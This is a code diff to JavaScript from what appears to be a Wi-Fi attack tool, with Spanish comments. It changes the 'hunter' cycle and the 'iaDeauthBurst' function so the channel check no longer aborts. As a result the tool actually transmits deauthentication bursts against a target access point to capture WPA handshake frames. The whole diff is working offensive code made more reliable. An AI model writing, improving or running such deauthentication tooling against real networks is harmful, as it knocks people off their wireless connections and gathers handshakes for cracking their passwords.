@@ -967,12 +967,15 @@ async function hunterCycle() {
     try {
       const vr = await window.__invoke('verify_channel_rf', { guid: ad.guid, secs: 3, bssid: t.bssid });
       log('[cazador] verify_channel_rf: ' + vr, 'info');
-      const m = String(vr).match(/canal dominante: (\\d+)/);
+      const m = String(vr).match(/canal dominante: (\d+)/);
       const dom = m ? parseInt(m[1]) : null;
-      if (dom !== null && dom !== t.channel) {
-        log('[cazador] canal real CH' + dom + ' != CH' + t.channel + ' — abortando ciclo', 'error');
-        window._hunterRunning = false;
-        if (window._hunterActive) window._hunterTimer = setTimeout(hunterCycle, 15000);
+      const tm = String(vr).match(/beacons objetivo: (\S+)/);
+      const hits = tm && tm[1] !== 'n/d' ? parseInt(tm[1]) : null;
+      // FIX 2026-11-27: NO abortar por un "canal dominante" ruidoso. Si vemos
+      // beacons del objetivo, estamos en su canal aunque el dominante sea otro
+      // AP. Antes esto abortaba cada ciclo y el cazador nunca transmitía.
+      if (hits === 0 || (hits === null && dom !== null && dom >= 1 && dom <= 14 && dom !== t.channel)) {
+        log('[cazador] sin beacons del objetivo en CH' + t.channel + ' (dominante CH' + dom + ') — reintentando', 'warn');
         return;
       }
     } catch (e) { log('[cazador] verify_channel_rf: ' + e, 'warn'); }
@@ -1905,13 +1908,25 @@ window.iaDeauthBurst = async function (args) {
     const dom = m ? parseInt(m[1]) : null;
     const t = String(vr).match(/beacons objetivo: (\S+)/);
     const hits = t && t[1] !== 'n/d' ? parseInt(t[1]) : null;
-    if (dom !== null && dom !== ch) {
+    // FIX 2026-11-27: los BEACONS DEL OBJETIVO son la prueba fiable del canal.
+    // El "canal dominante" se calcula de TODOS los beacons capturados y puede
+    // estar dominado por un AP vecino (o por IEs mal parseados) → antes daba
+    // CH48/CH184 y el cazador abortaba CADA ciclo sin transmitir nunca.
+    // Regla: si vemos beacons del objetivo (hits > 0), el canal está bien,
+    // aunque el canal dominante sea otro. Solo se aborta si NO hay beacons
+    // del objetivo (AP ausente) o si el dominante es un 2.4 GHz válido (1..14)
+    // distinto Y no hay ni un beacon objetivo.
+    const domValid2g = dom !== null && dom >= 1 && dom <= 14;
+    if (hits !== null && hits === 0) {
+      vrOk = false;
+      throw new Error('el AP objetivo no emite beacons → no está en este canal. Abortando TX.');
+    }
+    if (hits === null && domValid2g && dom !== ch) {
       vrOk = false;
       throw new Error('canal RF real es CH' + dom + ', no CH' + ch + ' → 0 EAPOL seguro. Abortando TX.');
     }
-    if (hits === 0) {
-      vrOk = false;
-      throw new Error('el AP objetivo no emite beacons en CH' + ch + ' → el canal no es el suyo. Abortando TX.');
+    if (hits !== null && hits > 0) {
+      log('[deauth] ' + hits + ' beacon(es) del objetivo vistos en CH' + ch + ' → canal confirmado (dominante CH' + dom + ' ignorado, es ruido).', 'ok');
     }
   } catch (e) {
     if (!vrOk) throw e;   // aborte real del TX (no silenciar)
